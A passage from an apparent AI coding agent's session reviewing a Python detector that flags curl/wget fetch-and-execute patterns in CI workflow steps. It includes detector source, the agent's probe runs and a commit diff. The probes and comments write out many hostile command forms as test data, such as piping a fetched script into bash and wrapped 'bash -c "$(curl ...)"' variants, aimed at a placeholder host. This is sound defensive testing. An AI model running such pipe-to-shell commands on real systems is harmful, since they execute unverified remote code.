   402	            out = getattr(part, "output", None)
   403	            for sub in getattr(out, "parts", []):
   404	                if getattr(sub, "kind", None) == "processsubstitution" and _is_interpreter(
   405	                    getattr(sub, "command", None)
   406	                ):
   407	                    return True
   408	    return False
   409	
   410	
   411	def _input_redirect_files(node: object) -> set[str]:
   412	    """Filenames a command reads via a `<`/`0<` redirect (`bash < f` USES f)."""
   413	    files: set[str] = set()
   414	    for part in getattr(node, "parts", []):
   415	        if getattr(part, "kind", None) == "redirect" and getattr(part, "type", None) in ("<", "0<"):
   416	            out = getattr(part, "output", None)
   417	            if out is not None and getattr(out, "kind", None) == "word":
   418	                files.add(out.word)
   419	    return files
   420	
   421	
   422	def _is_verifier(node: object) -> bool:
   423	    """A real verify command: a verifier tool with its check/verify subcommand or flag."""
   424	    words = _node_words(node)
   425	    if not words:
   426	        return False
   427	    name = _basename(words[0])
   428	    rest = words[1:]
   429	    if name in {"sha256sum", "sha512sum", "sha1sum", "shasum", "b2sum", "md5sum"}:
   430	        return any(w in ("-c", "--check") for w in rest)
   431	    if name == "cosign":
   432	        return any(w in ("verify", "verify-blob") for w in rest)
   433	    if name == "gpg":
   434	        return any(w in ("--verify", "--decrypt") for w in rest)
   435	    if name == "minisign":
   436	        return "-V" in rest
   437	    return False
   438	
   439	
   440	def _fetch_output_files(node: object, tool: str) -> set[str]:
   441	    """Files a curl/wget command writes (a later use of one is "used unverified fetched bytes").
   442	
   443	    Parses the bounded, stable curl/wget output grammar — `-o`/`--output`(`=`)`, the curl `-O`/
   444	    `--remote-name` and clustered/glued `-fsSLo FILE`/`-oFILE` forms, the wget `-O`/`-OFILE`/
   445	    `--output-document` forms, `--output-dir`/`-P`/`--directory-prefix` path prefixes, the wget
   446	    default-basename download, and any `>`/`>>` redirect target. Over-detecting a written file is
   447	    fail-closed; under-detecting (cycle-13 Group C: `wget -O`, glued `-o`, `--output-dir`) is the bug
   448	    this closes. Empty set ⇒ the fetch streams to stdout."""
   449	    words = _plain_words(node)
   450	    files: set[str] = set()
   451	    files |= _redirect_files(node)
   452	    urls = [w for w in words if "://" in w]
   453	    out_dir: str | None = None
   454	    i = 0
   455	    while i < len(words):
   456	        w = words[i]
   457	        nxt = words[i + 1] if i + 1 < len(words) else None
   458	        if w in ("--output-dir", "-P", "--directory-prefix") and nxt is not None:
   459	            out_dir = nxt
   460	            i += 2
   461	            continue
   462	        if w.startswith("--output-dir=") or w.startswith("--directory-prefix="):
   463	            out_dir = w.split("=", 1)[1]
   464	        elif w in ("-o", "--output") and nxt is not None:  # curl output; wget -o is a logfile → fail-closed
   465	            files.add(nxt.lstrip("="))
   466	            i += 2
   467	            continue
   468	        elif w.startswith("--output="):
   469	            files.add(w.split("=", 1)[1])
   470	        elif tool == "wget" and w in ("-O", "--output-document") and nxt is not None:
   471	            if nxt != "-":
   472	                files.add(nxt.lstrip("="))
   473	            i += 2
   474	            continue
   475	        elif tool == "wget" and w.startswith("--output-document="):
   476	            val = w.split("=", 1)[1]
   477	            if val != "-":
   478	                files.add(val)
   479	        elif tool == "wget" and re.fullmatch(r"-O.+", w):  # glued wget -OFILE / -O=FILE
   480	            val = w[2:].lstrip("=")
   481	            if val != "-":
   482	                files.add(val)
   483	        elif tool == "curl" and w in ("-O", "--remote-name", "--remote-name-all"):
   484	            files.update(_basename(u) for u in urls)
   485	        elif tool == "curl" and re.fullmatch(r"-[a-zA-Z]*o", w) and nxt is not None:  # cluster -…o FILE
   486	            files.add(nxt.lstrip("="))
   487	            i += 2
   488	            continue
   489	        elif tool == "curl" and not w.startswith("--") and re.fullmatch(r"-[a-zA-Z]*o=?.+", w):  # glued -oFILE
   490	            files.add(re.sub(r"^-[a-zA-Z]*o=?", "", w))
   491	        elif tool == "curl" and re.fullmatch(r"-[a-zA-Z]*O[a-zA-Z]*", w):  # cluster containing O
   492	            files.update(_basename(u) for u in urls)
   493	        i += 1
   494	    # wget writes the remote basename by default unless it streams to stdout.
   495	    if tool == "wget" and not files:
   496	        streams = any(
   497	            w in ("-O-", "-qO-", "--output-document=-") or (w in ("-O", "--output-document") and "-" in words)
   498	            for w in words
   499	        ) or any("/dev/stdout" in w for w in words)
   500	        if not streams:
   501	            files.update(_basename(u) for u in urls)
   502	    if out_dir:  # a path prefix yields both the bare basename and the prefixed path
   503	        prefix = out_dir.rstrip("/")
   504	        files |= {f"{prefix}/{_basename(f)}" for f in list(files)}
   505	        files |= {f"{prefix}/{_basename(u)}" for u in urls}
   506	    return files
   507	
   508	
   509	class _FetchWalk:
   510	    """Walks a bashlex AST collecting what's needed to decide §11.3 fetch-execute violations."""
   511	
   512	    def __init__(self, depth: int = 0) -> None:
   513	        self.violations: list[str] = []
   514	        self.downloads: set[str] = set()  # files holding unverified fetched bytes
   515	        self.has_verifier: bool = False  # a real verify command anywhere in the block → downloads vetted
   516	        self.used: set[str] = set()  # words used by non-fetch, non-verifier commands
   517	        self.depth: int = depth  # recursion depth into shell `-c` strings (cycle-15)
   518	
   519	    def walk(self, node: object) -> None:
   520	        kind = getattr(node, "kind", None)
   521	        if kind == "pipeline":
   522	            self._pipeline(node)
   523	        elif kind == "command":
   524	            self._command(node)
   525	        # GENERIC descent — every child node, whatever attribute holds it (including the inner command
   526	        # of a substitution, walked here so its own fetches are still collected). Never narrow this to
   527	        # named attributes: that is exactly how cycle-13 Group A failed open (compound/subshell/loop
   528	        # bodies and redirect-target substitutions were skipped). Whether a substitution EXECUTES is
   529	        # decided by its enclosing command in `_command`, not by the bare fact of being a substitution.
   530	        for child in _children(node):
   531	            self.walk(child)
   532	
   533	    def _pipeline(self, node: object) -> None:
   534	        elements = [p for p in node.parts if getattr(p, "kind", None) != "pipe"]
   535	        for idx, element in enumerate(elements):
   536	            # (A) a fetch's bytes flow into a downstream element. Safe only if EVERY downstream element
   537	            # is a pure-sink command — a stream cannot be checksum-verified mid-flight, so a verifier
   538	            # elsewhere never excuses it (C12-1), and a compound / subshell / wrapped non-sink counts as
   539	            # an executor (cycle-13 Group A/B).
   540	            if _subtree_has_fetch(element) and any(not _is_pure_sink(d) for d in elements[idx + 1 :]):
   541	                self.violations.append("fetch piped into a non-data-sink command")
   542	        if any(_subtree_has_fetch(e) for e in elements):
   543	            for element in elements:
   544	                if getattr(element, "kind", None) != "command":
   545	                    continue
   546	                if _redirects_to_interpreter_procsub(element):  # `curl | cat > >(bash)`
   547	                    self.violations.append("fetch written into a process substitution running a shell")
   548	                # Files written ANYWHERE in a fetch-bearing pipeline (`curl | cat > f`) hold fetched bytes.
   549	                tool = _fetch_tool(element)
   550	                self.downloads |= _fetch_output_files(element, tool) if tool else _redirect_files(element)
   551	
   552	    def _command(self, node: object) -> None:
   553	        tool = _fetch_tool(node)
   554	        if tool:
   555	            if _redirects_to_interpreter_procsub(node):
   556	                # `curl … > >(bash)` — the fetch's bytes are written straight into a shell. Execution.
   557	                self.violations.append("fetch written into a process substitution running a shell")
   558	            self.downloads |= _fetch_output_files(node, tool)
   559	            return
   560	        if _is_verifier(node):
   561	            # A real verify COMMAND (not a comment/string — the lexer dropped those) vets the block's
   562	            # DOWNLOADS. It does NOT vet a streamed fetch (handled above). Verify handling is deliberately
   563	            # BLOCK-LEVEL, not order/gating/artifact aware — an order-aware attempt (cycle-13 R5) was
   564	            # reverted (cycle-14 R1) because it false-positived every legitimate verified install whose
   565	            # checksum names the artifact (`printf "%s  %s" "$SHA" tool | sha256sum -c -`) or whose setup
   566	            # touches it (`chmod +x tool`) before the verifier ran. The cost: a verify that runs AFTER
   567	            # the use, fails open (`|| true`), or covers a DIFFERENT artifact still vets — documented
   568	            # out-of-scope for this honest-mistake gate (precise verify dataflow is the irreducible tail).
   569	            self.has_verifier = True
   570	            return
   571	        # (B) a fetch substitution that is EXECUTED — run as the command (`$(curl) …`) or fed to an
   572	        # interpreter (`bash -c "$(curl)"`, `bash <(curl)`, `bash <<<"$(curl)"`). A substitution merely
   573	        # CAPTURED as data (`X=$(curl)`, `echo "$(curl)"`) is not flagged — that is what keeps the gate
   574	        # usable on the dominant "fetch a value" pattern.
   575	        if _command_position_fetch_subst(node):
   576	            self.violations.append("fetch substitution run as a command")
   577	        elif _interpreter_executes_fetch(node):
   578	            self.violations.append("fetch substitution executed by an interpreter")
   579	        # cycle-15: a shell's static `-c`/`-e` STRING operand is itself shell — recursively scan it so
   580	        # `bash -c 'curl | bash'` (literal code, not a substitution) is not a fail-open. Depth-guarded.
   581	        if self.depth < _MAX_SHELL_DEPTH and _is_shell(node):
   582	            for operand in _static_code_operands(node):
   583	                for reason in _scan_block(operand, self.depth + 1):
   584	                    self.violations.append(f"shell -c string: {reason}")
   585	        self.used |= set(_plain_words(node)) | _input_redirect_files(node)  # `bash < f` USES f
   586	
   587	
   588	def _redirect_files(node: object) -> set[str]:
   589	    files: set[str] = set()
   590	    for part in getattr(node, "parts", []):
   591	        if getattr(part, "kind", None) == "redirect" and getattr(part, "type", None) in (">", ">>"):
   592	            out = getattr(part, "output", None)
   593	            if out is not None and getattr(out, "kind", None) == "word" and out.word != "/dev/null":
   594	                files.add(out.word)
   595	    return files
   596	
   597	
   598	def _file_match(download: str, word: str) -> bool:
   599	    """Whether a used `word` references a downloaded file. Normalises a leading `./` and matches on
   600	    basename ONLY when one side carries no directory — so `./install.sh` matches a downloaded
   601	    `install.sh`, but `/tmp/data.json` and `./fixtures/data.json` (different dirs) do NOT collide."""
   602	    d = download[2:] if download.startswith("./") else download
   603	    u = word[2:] if word.startswith("./") else word
   604	    return d == u or ("/" not in d and _basename(u) == d) or ("/" not in u and _basename(d) == u)
   605	
   606	
   607	def _scan_block(block: str, depth: int = 0) -> list[str]:
   608	    """Parse one shell block and return its fetch-execute violation reasons. Recursive: a shell's static
   609	    `-c`/`-e` string operand IS more shell, so it is scanned at ``depth+1`` (cycle-15: `bash -c 'curl |
   610	    bash'` is a literal code string, not a substitution). A block that mentions curl/wget but bashlex
   611	    cannot parse fails CLOSED."""
   612	    import bashlex
   613	
   614	    if not _FETCH_RE.search(block):
   615	        return []
   616	    try:
   617	        trees = bashlex.parse(block)
   618	    except Exception:  # noqa: BLE001 — ANY parse failure (templated/garbled) → cannot prove safe
   619	        return [f"(unparsed block): {block.strip()[:80]}"]
   620	    walk = _FetchWalk(depth)
   621	    for tree in trees:
   622	        walk.walk(tree)
   623	    reasons = list(walk.violations)
   624	    # (C) a downloaded file used by a later command, with no verify command in the block. `./install.sh`
   625	    # matches a downloaded `install.sh`, but unrelated paths sharing a basename (`/tmp/data.json` vs
   626	    # `./fixtures/data.json`) do not collide.
   627	    if not walk.has_verifier:
   628	        unverified = sorted(d for d in walk.downloads if any(_file_match(d, word) for word in walk.used))
   629	        if unverified:
   630	            reasons.append(f"unverified downloaded file used: {unverified}")
   631	    return reasons
   632	
   633	
   634	def fetch_execute_violations(text: str) -> list[str]:
   635	    """Fail-closed §11.3 fetch-execute check over a real shell AST (design contract above).
   636	
   637	    For each ``run:`` block: parse it with bashlex and walk the AST. A `curl`/`wget` is flagged when
   638	    its output reaches execution (non-sink pipe / executed substitution / a downloaded file used
   639	    unverified / a shell `-c` string that itself fetch-executes)."""
   640	    violations: list[str] = []
   641	    for block in _run_blocks(text):
   642	        reasons = _scan_block(block, 0)
   643	        if reasons:
   644	            violations.append(f"fetch-and-execute without checksum: {reasons[0]}")
   645	    return violations
   646	
   647	
   648	# §11.3: a tool installed from a package index that exposes no digest (a pip package)
   649	# must be pinned to an EXACT version, never a floating latest. Match a `pip install`
   650	# invocation and inspect the package tokens after it.
   651	_PIP_INSTALL_RE = re.compile(r"\bpip[0-9]*\s+install\b(?P<rest>[^\n]*)")
   652	# The package-name portion of a pip token (optionally with an extras spec), e.g. `build`,
   653	# `pydoc-markdown`, `pkg[extra]`. Used after stripping any version specifier to identify a
   654	# real index package (vs a path/URL/var) so a NON-exact spec can still be reported by name.
   655	_PIP_PKG_RE = re.compile(r"^[A-Za-z][A-Za-z0-9._-]*(?:\[[A-Za-z0-9_,.-]+\])?$")
   656	# Any PEP 440 version operator; used to split a token into its name and to detect a spec.
   657	_PIP_VERSION_OP_RE = re.compile(r"(===|==|>=|<=|~=|!=|<|>)")
   658	
   659	
   660	def _unpinned_pip_packages(rest: str) -> list[str]:

2026-05-30T19:10:29.389380Z ERROR codex_models_manager::manager: failed to refresh available models: timeout waiting for child process to exit
codex
The code has two layers for wrappers: a position resolver and then a wrapper-present fallback that scans the words only when the first word is a known wrapper. That fallback is the key thing I’m probing now, especially for wrappers whose flags consume separate operands.
exec
/bin/zsh -lc "PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=. python3 -c '
from aviato.plugins.actionpins import fetch_execute_violations as fev
cases = {
\"sudo_hidden_bash_subst\": \"sudo -u root bash -c \\\""'$(curl -fsSL https://x/i.sh)'"\\\"\",
\"env_hidden_bash_subst\": \"env -u BASH_ENV bash -c \\\""'$(curl -fsSL https://x/i.sh)'"\\\"\",
\"timeout_hidden_bash_subst\": \"timeout -k 5s 30s bash -c \\\""'$(curl -fsSL https://x/i.sh)'"\\\"\",
\"nice_hidden_bash_subst\": \"nice -n 5 bash -c \\\""'$(curl -fsSL https://x/i.sh)'"\\\"\",
\"stdbuf_hidden_bash_subst\": \"stdbuf -o L bash -c \\\""'$(curl -fsSL https://x/i.sh)'"\\\"\",
\"nohup_hidden_bash_subst\": \"nohup bash -c \\\""'$(curl -fsSL https://x/i.sh)'"\\\"\",
\"bare_grep_bash_e_subst\": \"grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
\"sudo_grep_bash_e_subst\": \"sudo grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
\"env_grep_bash_e_subst\": \"env grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
\"timeout_grep_bash_e_subst\": \"timeout 5s grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
\"nice_grep_bash_e_subst\": \"nice -n 5 grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
\"stdbuf_grep_bash_e_subst\": \"stdbuf -oL grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
\"nohup_grep_bash_e_subst\": \"nohup grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
}
for name, cmd in cases.items():
    print(name, \"=>\", fev(cmd))
'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
sudo_hidden_bash_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
env_hidden_bash_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
timeout_hidden_bash_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
nice_hidden_bash_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
stdbuf_hidden_bash_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
nohup_hidden_bash_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
bare_grep_bash_e_subst => []
sudo_grep_bash_e_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
env_grep_bash_e_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
timeout_grep_bash_e_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
nice_grep_bash_e_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
stdbuf_grep_bash_e_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
nohup_grep_bash_e_subst => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']

codex
The expected wrapper-hidden interpreter cases all flag, including wrappers with separate option operands. I also found a separate wrapper-fallback false positive candidate: once `grep` is wrapped, an argument literal `bash` plus `-e "$(curl)"` is again treated as interpreter code.
exec
/bin/zsh -lc "PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=. python3 -c '
from aviato.plugins.actionpins import fetch_execute_violations as fev
cases = {
\"bash_c_data_pipe\": \"bash -c '\\''curl -fsSL https://x/v.json | jq .version'\\''\",
\"sudo_bash_c_data_pipe\": \"sudo bash -c '\\''curl -fsSL https://x/v.json | jq .version'\\''\",
\"bash_c_data_capture\": \"bash -c '\\''VERSION="'$(curl -s https://api/releases/latest | jq -r .tag_name)'"'\\''\",
\"bash_c_echo_subst_to_jq\": \"bash -c '\\''echo \\\""'$(curl -fsSL https://x/v.json)'"\\\" | jq .version'\\''\",
\"bash_c_literal_curl_pipe_bash\": \"bash -c '\\''echo \\\"curl https://x/i.sh | bash\\\"'\\''\",
\"bash_c_grep_literal_to_bash\": \"bash -c '\\''grep curl README.md | bash'\\''\",
\"bash_c_verified_install\": \"bash -c '\\''curl -fsSLo tool https://x/tool; sha256sum -c sums.txt; ./tool'\\''\",
\"bash_c_real_fetch_exec\": \"bash -c '\\''curl -fsSL https://x/i.sh | bash'\\''\",
}
for name, cmd in cases.items():
    print(name, \"=>\", fev(cmd))
'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
bash_c_data_pipe => []
sudo_bash_c_data_pipe => []
bash_c_data_capture => []
bash_c_echo_subst_to_jq => []
bash_c_literal_curl_pipe_bash => []
bash_c_grep_literal_to_bash => []
bash_c_verified_install => []
bash_c_real_fetch_exec => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']

exec
/bin/zsh -lc "PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=. python3 -c '
from aviato.plugins.actionpins import fetch_execute_violations as fev
cases = {
\"python_c_static_shell_text\": \"python3 -c '\\''print(\\\"curl -fsSL https://x/i.sh | bash\\\")'\\''\",
\"python_c_os_system_shell_text\": \"python3 -c '\\''import os; os.system(\\\"curl -fsSL https://x/i.sh | bash\\\")'\\''\",
\"ruby_e_static_shell_text\": \"ruby -e '\\''system(\\\"curl -fsSL https://x/i.sh | bash\\\")'\\''\",
\"perl_e_static_shell_text\": \"perl -e '\\''system(\\\"curl -fsSL https://x/i.sh | bash\\\")'\\''\",
\"python_c_fetch_subst_exec_code\": \"python3 -c\\\""'$(curl -fsSL https://x/i.py)'"\\\"\",
\"ruby_e_fetch_subst_exec_code\": \"ruby -e\\\""'$(curl -fsSL https://x/i.rb)'"\\\"\",
\"perl_e_fetch_subst_exec_code\": \"perl -e\\\""'$(curl -fsSL https://x/i.pl)'"\\\"\",
}
for name, cmd in cases.items():
    print(name, \"=>\", fev(cmd))
'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
python_c_static_shell_text => []
python_c_os_system_shell_text => []
ruby_e_static_shell_text => []
perl_e_static_shell_text => []
python_c_fetch_subst_exec_code => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
ruby_e_fetch_subst_exec_code => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
perl_e_fetch_subst_exec_code => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']

exec
/bin/zsh -lc "PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=. python3 -c '
from aviato.plugins.actionpins import fetch_execute_violations as fev
cases = {
\"bash_e_script_name_shell_text\": \"bash -e '\\''curl -fsSL https://x/i.sh | bash'\\''\",
\"sh_e_script_name_shell_text\": \"sh -e '\\''curl -fsSL https://x/i.sh | sh'\\''\",
\"sudo_bash_e_script_name_shell_text\": \"sudo bash -e '\\''curl -fsSL https://x/i.sh | bash'\\''\",
\"bash_errexit_then_file\": \"bash -e install.sh\",
\"bash_c_real_shell_text\": \"bash -c '\\''curl -fsSL https://x/i.sh | bash'\\''\",
}
for name, cmd in cases.items():
    print(name, \"=>\", fev(cmd))
'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
bash_e_script_name_shell_text => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
sh_e_script_name_shell_text => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
sudo_bash_e_script_name_shell_text => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
bash_errexit_then_file => []
bash_c_real_shell_text => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']

codex
The `bash -c` recursion itself looks stable on the data cases I tried: data pipes, variable capture, quoted literals, and verified install shapes all stay clean, while real `curl | bash` inside `-c` flags. I’m checking the non-shell interpreter and shell `-e` edges before I call the verdict.
exec
/bin/zsh -lc "PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=. python3 -c '
import bashlex
from aviato.plugins import actionpins as a

def first_command(s):
    tree = bashlex.parse(s)[0]
    stack = [tree]
    while stack:
        n = stack.pop(0)
        if getattr(n, \"kind\", None) == \"command\":
            return n
        stack.extend(a._children(n))
    raise RuntimeError(\"no command\")

for label, s in {
    \"wrapped_grep\": \"sudo grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
    \"bash_e_static\": \"bash -e '\\''curl -fsSL https://x/i.sh | bash'\\''\",
    \"bash_c_static\": \"bash -c '\\''curl -fsSL https://x/i.sh | bash'\\''\",
}.items():
    node = first_command(s)
    print(label)
    print(\"  words=\", a._plain_words(node))
    print(\"  resolved=\", a._resolved_program(node))
    print(\"  is_interpreter=\", a._is_interpreter(node))
    print(\"  is_shell=\", a._is_shell(node))
    print(\"  static_operands=\", a._static_code_operands(node))
    print(\"  fev=\", a.fetch_execute_violations(s))
'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
wrapped_grep
  words= ['sudo', 'grep', 'bash', '-e', '$(curl -fsSL https://x/p)', 'file']
  resolved= grep
  is_interpreter= True
  is_shell= True
  static_operands= []
  fev= ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
bash_e_static
  words= ['bash', '-e', 'curl -fsSL https://x/i.sh | bash']
  resolved= bash
  is_interpreter= True
  is_shell= True
  static_operands= ['curl -fsSL https://x/i.sh | bash']
  fev= ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
bash_c_static
  words= ['bash', '-c', 'curl -fsSL https://x/i.sh | bash']
  resolved= bash
  is_interpreter= True
  is_shell= True
  static_operands= ['curl -fsSL https://x/i.sh | bash']
  fev= ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']

exec
/bin/zsh -lc 'git show --stat --patch --unified=80 HEAD -- aviato/plugins/actionpins.py tests/core/test_fetch_execute.py' in /Users/amattas/GitHub/aviato
 succeeded in 1224ms:
2026-05-30 15:12:25.605 xcodebuild[73739:39952801]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:12:25.713 xcodebuild[73739:39952800] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
git: warning: confstr() failed with code 5: couldn't get path of DARWIN_USER_TEMP_DIR; using /tmp instead
git: error: couldn't create cache file '/tmp/xcrun_db-hR2gfn5y' (errno=Operation not permitted)
2026-05-30 15:12:26.017 xcodebuild[73741:39952815]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:12:26.111 xcodebuild[73741:39952814] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
commit cb13d572b429ef26d0e0bb4e5914320869ecb0ee
Author: Anthony Mattas <anthony@mattas.net>
Date:   Sat May 30 15:08:43 2026 -0400

    fix: cycle-15 review — detector FP/fail-open, enforce_admins gap, apply-rulesets mutex
    
    Dual-engine review of the cycle-14 fixes. Most were confirmed correct; four items fixed:
    
    - detector FP (efb036a flap): `_is_interpreter` matched ANY word, so `grep bash -e"$(curl)"`
      read `bash` as an interpreter and flagged. Now resolves the PROGRAM through wrappers with a
      wrapper-present fallback (mirrors `_fetch_tool`) — `sudo -u root bash -c …` still flags,
      `grep bash -e …` no longer FPs.
    - detector fail-open (pre-existing, NOT a flap): a shell's static `-c`/`-e` STRING operand
      (`bash -c 'curl | bash'`) was a literal word, not a substitution, so it was missed. Now
      recursively scanned as shell (depth-guarded); `python -c` (python code) is never re-parsed.
    - enforce_admins gap (github_platform.py): a ruleset rule satisfied enforce_admins even when a
      CLASSIC protection was present with enforce_admins disabled — admin bypass of the classic
      protections read clean. The ruleset now satisfies enforce_admins only when there is no
      present-but-unenforced classic protection.
    - apply-rulesets (C12-3 incomplete): `--profile` and `--declaration` are now a mutually
      exclusive argparse group instead of silently letting the declaration win.
    
    Confirmed correct by both engines (no change): N1, N3 bypass read, C12-R3-1 reconcile re-read,
    gh_json_paginated_optional, the Pages build/deploy split. Tests added. Full strict gate green
    (700 passed); detector self-scan clean.
---
 aviato/plugins/actionpins.py     | 103 ++++++++++++++++++++++++++++-----------
 tests/core/test_fetch_execute.py |   9 ++++
 2 files changed, 84 insertions(+), 28 deletions(-)

diff --git a/aviato/plugins/actionpins.py b/aviato/plugins/actionpins.py
index 1e7f3b9..eb46de9 100644
--- a/aviato/plugins/actionpins.py
+++ b/aviato/plugins/actionpins.py
@@ -20,160 +20,161 @@ _SHA_RE = re.compile(r"^[0-9a-f]{40}$")
 
 def _is_third_party(action_ref: str) -> bool:
     # Local (``./...``) refs and the consumer's own Library reference are exempt; every other
     # owner — including a non-Library reusable-workflow ref — is third-party (§11.3).
     if action_ref.startswith("./") or action_ref.startswith(_LIBRARY_REUSABLE_PREFIX):
         return False
     owner = action_ref.split("/", 1)[0]
     return owner not in _FIRST_PARTY_OWNERS
 
 
 def unpinned_third_party_uses(text: str) -> list[str]:
     """Return third-party ``uses:`` refs in a workflow not pinned to a commit SHA (§11.3)."""
     violations: list[str] = []
     for ref in _USES_RE.findall(text):
         if "@" not in ref:
             continue
         action, _, version = ref.partition("@")
         if _is_third_party(action) and not _SHA_RE.match(version):
             violations.append(ref)
     return violations
 
 
 # §11.3 fetch-execute detection — built on REAL parsers (PyYAML for `run:` extraction, bashlex for the
 # shell AST), not regex. Five prior text/partial-AST shapes flapped (cycle-9 enumeration, cycle-10
 # checksum-word+sink, cycle-11 regex-split taint, cycle-12 "coarse", cycle-13 the first bashlex walk —
 # each reopened a hole: quotes, comments, `2>&1`, option clusters, substitution, and then — once the
 # lexer was right — STRUCTURAL holes the walk skipped: compound/subshell/loop bodies, redirect-target
 # substitutions, command wrappers, quoted/flow `run:` keys). The convergent lesson (both engines):
 # the parser must be real AND the traversal must be total. So:
 #   - `run:` blocks are pulled from a real YAML parse (quoted keys / flow-style steps can't hide), with
 #     a tolerant line fallback only for templated scaffold bodies that aren't valid YAML.
 #   - the AST is walked GENERICALLY — every child node of every node, regardless of the attribute that
 #     holds it (`parts`/`list`/`command`/`output`/heredoc/…) — so no subtree is ever skipped.
 # The rule: a `curl`/`wget` is a violation if its output reaches EXECUTION —
 #   (A) it pipes into a downstream pipeline element that is not a pure-data-sink command, or
 #   (B) a command/process substitution carrying the fetch is EXECUTED — it is in command position
 #       (`$(curl) …`) or fed to an interpreter (`bash -c "$(curl)"`, `bash <(curl)`, `bash <<<"$(curl)"`,
 #       `. <(curl)`), or written into `>(interpreter)`, or
 #   (C) it writes a file that a later command uses (by basename, as an arg, or via a `<` redirect) and
 #       the block carries NO verify command.
 # Programs are resolved through transparent wrappers (`sudo`/`env`/`timeout …`) so `sudo curl` is a
 # fetch and `env jq` is a sink; a fetch in a substitution that is only CAPTURED as data (`X=$(curl)`,
 # `echo "$(curl)"`) is NOT execution and is not flagged — that distinction (interpreter vs data
 # context) is what keeps the gate usable. A bare fetch to stdout, a pipe into pure sinks only, and
 # download → verify → use are clean. Fail CLOSED on the undecidable: a block bashlex can't parse, an
 # unrecognised pipeline element. DOCUMENTED out-of-scope (best-effort gate for HONEST mistakes — NOT a
 # complete control against an author obfuscating their own CI; a precise static "do fetched bytes reach
 # execution" analysis over shell has an irreducible tail): heredoc-body execution
 # (`bash <<EOF … $(curl) … EOF`), parameter-default obfuscation (`${X:-$(curl)}`), dynamic command
 # words (`$CMD`/`sh -c "bash $f"`), and a quoted/flow `run:` key inside a TEMPLATED (non-YAML) scaffold
 # body. Verify handling is BLOCK-LEVEL: any real verify command in the block vets the block's downloads,
 # so a verify that runs AFTER the use, fails open (`… || true`), or covers a DIFFERENT artifact still
 # vets — precise verify dataflow (order/gating/artifact-binding) is the irreducible tail and an
 # order-aware attempt (cycle-13) was reverted (cycle-14) for FP-ing every verified install whose
 # checksum/setup names the artifact before the verifier (`printf … tool | sha256sum -c -`). Convergent
 # design; do not revert it to text matching, and do not narrow the generic descent.
 _FETCH_RE = re.compile(r"\b(?:curl|wget)\b")  # cheap pre-filter only; the real check is the AST walk
 _FETCH_NAMES = frozenset({"curl", "wget"})
 # Pure data sinks: consume stdin and emit to stdout only — never execute stdin nor (without an explicit
 # redirect) write a file. Deliberately EXCLUDES sort (`--compress-program=CMD` executes, cycle-12
 # C12-9), less/more (shell escapes), awk/sed (`-f`/`-e`), xargs, tee (writes a file), and every shell.
 _PURE_SINKS = frozenset({"jq", "grep", "egrep", "fgrep", "rg", "head", "tail", "cut", "tr", "nl", "wc", "cat"})
 # Transparent wrappers peeled to resolve a command's real program: `sudo curl`/`env curl`/`timeout 5
 # curl` are fetches, `env jq` is a sink. Resolving by program position (not "any word") also stops a
 # literal `curl`/`wget` ARGUMENT (`grep curl`) being mistaken for a fetch.
 _WRAPPERS = frozenset(
     {"sudo", "env", "command", "nice", "ionice", "nohup", "stdbuf", "setsid", "time", "timeout", "doas", "chronic"}
 )
 # Interpreters: a substitution fed to one of these is EXECUTED (vs merely captured as data). The dual of
 # _PURE_SINKS for the substitution rule. `python`/`perl`/`ruby`/`node` are included conservatively.
 _INTERPRETERS = frozenset(
     {"bash", "sh", "dash", "zsh", "ksh", "ash", "eval", "source", ".", "xargs",
      "python", "python2", "python3", "perl", "ruby", "node", "nodejs", "php", "pwsh", "powershell"}
 )  # fmt: skip
